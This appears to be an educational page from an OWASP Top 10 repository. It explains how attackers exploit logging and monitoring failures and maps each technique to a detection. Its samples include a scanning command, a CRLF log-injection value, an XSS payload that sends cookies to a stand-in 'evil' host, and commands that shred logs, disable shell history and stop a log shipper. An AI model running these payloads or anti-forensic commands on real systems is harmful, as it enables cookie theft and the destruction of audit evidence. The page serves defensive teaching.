# Security Logging and Monitoring Failures - Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY.** The techniques below are described so that defenders can understand what silence looks like from the attacker's side and build detection for it. Test only against systems you own or are explicitly authorised to assess.

## Table of Contents

- [The Core Flow: Operating in the Dark](#the-core-flow-operating-in-the-dark)
- [1. Silent Reconnaissance and Scanning](#1-silent-reconnaissance-and-scanning)
- [2. Credential Stuffing Against Unlogged Failures](#2-credential-stuffing-against-unlogged-failures)
- [3. Forced Browsing Past Unlogged Access Denials](#3-forced-browsing-past-unlogged-access-denials)
- [4. Slow, Low-Volume Data Exfiltration](#4-slow-low-volume-data-exfiltration)
- [5. Log Injection and Forged Entries](#5-log-injection-and-forged-entries)
- [6. Log Tampering and Anti-Forensics](#6-log-tampering-and-anti-forensics)
- [7. Exploiting Swallowed Errors and Exceptions](#7-exploiting-swallowed-errors-and-exceptions)
- [8. Local-Only Logs and Evidence Loss](#8-local-only-logs-and-evidence-loss)
- [9. Blinding the Monitoring Pipeline](#9-blinding-the-monitoring-pipeline)
- [10. Time Desynchronization and Timeline Confusion](#10-time-desynchronization-and-timeline-confusion)
- [11. Alert Fatigue and Threshold Evasion](#11-alert-fatigue-and-threshold-evasion)
- [12. Harvesting Secrets and PII from Logs](#12-harvesting-secrets-and-pii-from-logs)
- [Turning Each Vector Into a Detection](#turning-each-vector-into-a-detection)

## The Core Flow: Operating in the Dark

An attacker's objective in the context of A9:2021 is simple: **complete the kill chain before anyone notices**. Every step an intruder takes — reconnaissance, exploitation, lateral movement, exfiltration — emits signals. Logging and monitoring failures mean those signals are never recorded, never correlated, or never alerted on. The attacker's work is therefore less about defeating a control and more about exploiting the *absence* of one.

```
Recon      ->  Exploit      ->  Persist       ->  Move         ->  Exfiltrate
  |               |                |                 |                 |
Unlogged      Unlogged         Unlogged          Unlogged          Unlogged
scans         auth failures    new admin user    cross-service     large export
  |               |                |                 |                 |
  +---------------+----------------+-----------------+-----------------+
                                   |
                      No event, no correlation, no alert
                                   |
                        DWELL: days -> weeks -> months
```

The vectors below are framed the way an attacker experiences them: as **activity that goes undetected**. For each, note what *should* have generated a log or alert — that gap is the vulnerability.

## 1. Silent Reconnaissance and Scanning

Reconnaissance is the noisiest phase of any attack — a scanner may send thousands of requests, hit hundreds of nonexistent paths, and probe for known-vulnerable endpoints. It is also the cheapest thing in the world to detect. When 404 floods, forced-browsing patterns, and scanner user-agents produce no aggregated log or alert, the attacker gets to map the entire attack surface risk-free.

```
# From the attacker's terminal: a directory/vuln scan
$ ffuf -u https://target/FUZZ -w wordlist.txt -mc all
/admin           [Status: 403]
/.git/config     [Status: 200]   <- juicy
/backup.zip      [Status: 200]   <- juicy
/api/v1/users    [Status: 401]
... 4,000 requests in 90 seconds ...

# What the defender SHOULD see but doesn't:
#   - a spike of 4xx responses from one IP
#   - a known scanner signature in User-Agent
#   - repeated access to sensitive paths (.git, backups)
# With no rate/anomaly alerting, none of this fires.
```

**Why it goes undetected**: 4xx responses are often treated as "normal noise" and filtered out of logs entirely, or logged without any per-source aggregation that would reveal the burst.

## 2. Credential Stuffing Against Unlogged Failures

Credential stuffing replays leaked username/password pairs at scale. The single most important defensive signal — **failed authentication attempts** — is exactly what many applications fail to log, or log without the source IP and username needed to spot a pattern.

```
# Attacker replays a breach corpus
for combo in creds.txt:
    POST /login {user, pass}
    -> 200 means a hit; 401 means try the next

# 50,000 attempts, ~0.1% hit rate = 50 compromised accounts
# Defender's blind spots that make this silent:
#   - failed logins not logged at all, OR
#   - logged without user_id / source_ip, OR
#   - logged but no threshold alert on "N failures in M minutes"
```

**The tell that is missed**: a small number of failures spread across a huge number of *distinct* usernames from a rotating IP pool. Without structured, alertable auth-failure logs, the campaign is invisible until compromised accounts are abused.

## 3. Forced Browsing Past Unlogged Access Denials

When an attacker probes for broken access control (IDOR, missing function-level checks), the application may correctly return `403` — but if that **authorization denial is never logged**, the attacker can iterate through thousands of object IDs and privileged endpoints until one succeeds, with no trail.

```
GET /api/invoices/1001   -> 403
GET /api/invoices/1002   -> 403
GET /api/invoices/1003   -> 200   <- misconfigured object, ACCESS!
GET /api/admin/export    -> 403
...thousands of denials, none logged...

# A single user generating hundreds of 403s across
# object IDs is a textbook access-control probe.
# Unlogged, it's indistinguishable from silence.
```

**Why it matters**: access-control failures are explicitly called out by OWASP as must-log events. Their absence lets an attacker brute-force authorization boundaries undetected.

## 4. Slow, Low-Volume Data Exfiltration

Rather than dumping a database in one query, a patient attacker paginates — pulling a few hundred records at a time over days. Without logging of **data-access volume per user** and alerting on anomalies, the aggregate theft never crosses a visible threshold.

```
Day 1: GET /api/customers?page=1..20   (2,000 records)
Day 2: GET /api/customers?page=21..40  (2,000 records)
...
Day 30: 60,000 records exfiltrated, one "normal-looking" page at a time.

# Missing signals:
#   - no per-user cumulative record-access counter
#   - no baseline of "normal" export volume
#   - no alert on export endpoints hit off-hours
```

## 5. Log Injection and Forged Entries

When untrusted input is written to logs without neutralization, an attacker can inject newline characters (`CR`/`LF`) to **forge additional log lines** — framing another user, hiding their own actions, or breaking the log parser. If a dashboard renders logs as HTML, injected markup becomes **stored XSS against the responders**.

```
# Attacker sets username to a payload containing CRLF:
username = "alice\n2026-08-28 14:00:00 INFO authn.login.success user_id=admin"

# Naive logging:
log.info("Failed login for user: " + username)

# Resulting log file (two lines - one FORGED):
2026-08-28 13:59:59 WARN  Failed login for user: alice
2026-08-28 14:00:00 INFO  authn.login.success user_id=admin   <- FAKE

# If the SIEM UI renders this field as HTML:
username = "<script>fetch('//evil/'+document.cookie)</script>"
# -> stored XSS executing in the analyst's browser
```

**Impact**: corrupted audit trail, misattributed blame, poisoned detections, and compromise of the monitoring tooling itself (CWE-117).

## 6. Log Tampering and Anti-Forensics

Once an attacker has host access, mutable local logs are a liability for the defender and an opportunity for the attacker. Editing or truncating log files, clearing the shell history, and disabling the logging agent are standard anti-forensic moves.

```
# Classic anti-forensics on a compromised host:
$ shred -u /var/log/auth.log        # destroy auth history
$ : > /var/log/app/application.log  # truncate app log
$ export HISTFILE=/dev/null         # stop shell history
$ systemctl stop filebeat           # kill the log shipper

# If logs live ONLY on this host and are writable,
# the attacker's entire session vanishes.
```

**Why it works**: logs stored only locally, with write/delete permissions available to a compromised process, have no integrity guarantee. Append-only, off-host, real-time shipping is what defeats this.

## 7. Exploiting Swallowed Errors and Exceptions

Applications that catch exceptions and discard them — `catch (e) {}` — hide exactly the anomalies that signal an attack in progress: deserialization failures, SQL errors from injection probes, and unexpected type coercions. The attacker relies on the application *not complaining*.

```python
try:
    obj = pickle.loads(user_supplied)     # deserialization attack surface
except Exception:
    pass                                   # <- swallowed: attacker probes freely

# Each malformed payload that would have raised a loud
# WARN/ERROR instead produces silence. The attacker tunes
# the exploit iteratively with zero defender visibility.
```

**The gap**: OWASP explicitly lists "warnings and errors generate no, inadequate, or unclear log messages" as a defining condition of A9. Silent failure is an attacker's ally.

## 8. Local-Only Logs and Evidence Loss

Even without deliberate tampering, logs confined to a single host are lost when that host is reimaged, autoscaled away, or destroyed. Ephemeral containers make this acute: a compromised pod that is rescheduled takes its evidence with it.

```
attacker compromises pod-a  -->  logs written to pod-a's local filesystem
Kubernetes reschedules pod-a  -->  container destroyed
                                     |
                          all local logs gone forever
                                     |
                    investigation has nothing to work with
```

**Attacker benefit**: in cloud-native environments, simply waiting for normal churn can erase the trail if logs are not shipped centrally in near-real-time.

## 9. Blinding the Monitoring Pipeline

Detection depends on a chain of components — shippers, collectors, parsers, and rules. An attacker who can degrade any link blinds the defender without touching the application. Real breaches have hinged on a monitoring sensor being silently non-functional (for example, an expired certificate on an inspection appliance) so that traffic flowed uninspected for months.

```
Failure modes an attacker exploits (or that simply exist unnoticed):
  - log shipper crashed / backpressured -> events dropped
  - parser rejects a new log format      -> events unindexed, unsearchable
  - inspection cert expired              -> traffic passes uninspected
  - SIEM ingestion quota exceeded        -> silent drop of overflow
Each leaves the app "logging" while the defender sees nothing.
```

**Key point**: the monitoring stack needs its own health checks and alerting. A pipeline that fails silently is functionally identical to having no logging at all.

## 10. Time Desynchronization and Timeline Confusion

Forensics is the art of ordering events. If servers disagree about the time — no NTP, mixed local timezones, no UTC standard — correlating a login on one service with a data export on another becomes guesswork, and an attacker's sequence of actions cannot be reconstructed.

```
web-01  logs:  10:14:02 (local, America/Chicago, no NTP drift +37s)
api-03  logs:  15:13:25 (UTC)
db-07   logs:  Aug 28 03:13 PM (no seconds, no zone)

# Which happened first? Impossible to say with confidence.
# The attacker's chain of events cannot be stitched together.
```

**Why attackers benefit**: even when every event is logged, unsynchronized clocks make the timeline — the core deliverable of an investigation — unreliable or inadmissible.

## 11. Alert Fatigue and Threshold Evasion

Ineffective alerting is as exploitable as absent alerting. Two failure shapes dominate. First, **too many alerts**: a firehose of low-value notifications trains responders to ignore the channel, so the one real alert is missed (the pattern behind several major breaches where the alarm *did* fire). Second, **thresholds that are trivially evaded**: an attacker who knows the limit simply stays just under it.

```
# Threshold: "alert if > 100 failed logins per IP per hour"
# Attacker response: 90 attempts/hour per IP, rotate across 500 IPs
#   -> 45,000 attempts/hour, ZERO alerts

# Fatigue variant: 4,000 alerts/day, 99.9% false positives
#   -> analysts mute the channel -> real intrusion blends in
```

**Defender lesson**: thresholds must consider distributed sources and cumulative behaviour, and alert volume must be tuned so that every alert is worth a human's attention.

## 12. Harvesting Secrets and PII from Logs

When applications log request bodies, headers, query strings, or exception detail verbosely, they routinely capture passwords, session tokens, API keys, and full PII in cleartext. An attacker who reaches the log store — often less protected than the primary database — gets a second, pre-decrypted trove.

```
# Verbose logging captures the whole request:
2026-08-28 14:03 DEBUG POST /login body={"user":"bob","password":"Hunter2!"}
2026-08-28 14:05 DEBUG Authorization: Bearer eyJhbGciOi...   <- live token
2026-08-28 14:06 ERROR card=4111111111111111 exp=05/29 cvv=931

# The log aggregator, backups, and log-viewer UI now hold
# credentials and card data an attacker can lift wholesale (CWE-532).
```

**Double failure**: this both violates data-protection rules directly and hands the attacker exactly what stronger controls elsewhere were meant to protect.

## Turning Each Vector Into a Detection

Every vector above is a missed opportunity. The table maps the attacker activity to the log/alert that should have caught it — this is the bridge to the Prevention page.

| Attacker activity | Signal that should fire | Missing control |
|-------------------|-------------------------|-----------------|
| Directory/vuln scanning | Per-IP spike in 4xx / sensitive-path hits | Rate & anomaly alerting on responses |
| Credential stuffing | Failed logins across many usernames | Structured auth-failure logs + threshold alert |
| Forced browsing / IDOR probing | Burst of 403s per user across object IDs | Logged access-control denials |
| Slow exfiltration | Cumulative record-access anomaly | Per-user data-volume baselining |
| Log injection | CR/LF or markup in a logged field | Output neutralization / encoding |
| Log tampering | Gap or integrity break in the log stream | Append-only off-host shipping |
| Swallowed errors | Deserialization/SQL error events | Log-and-rethrow, no empty catch |
| Pipeline blinding | Shipper/sensor health degraded | Monitoring-of-the-monitoring |
| Time desync | Clock skew between hosts | NTP + UTC everywhere |
| Threshold evasion | Distributed low-and-slow pattern | Cross-source correlation |

## What's Next?

- **[Overview](./overview.md)**: Understand the A9:2021 category and its lineage
- **[Prevention](./prevention.md)**: Build the logging, monitoring, and alerting these attacks assume you lack
- **[Examples](./examples.md)**: Vulnerable vs secure structured logging in Python, Node, and Java
- **[Lab](./lab/no-logging-lab/)**: Practice identification in a safe, isolated environment

---

*Part of the [OWASP Top 10 Educational Repository](../../README.md)*
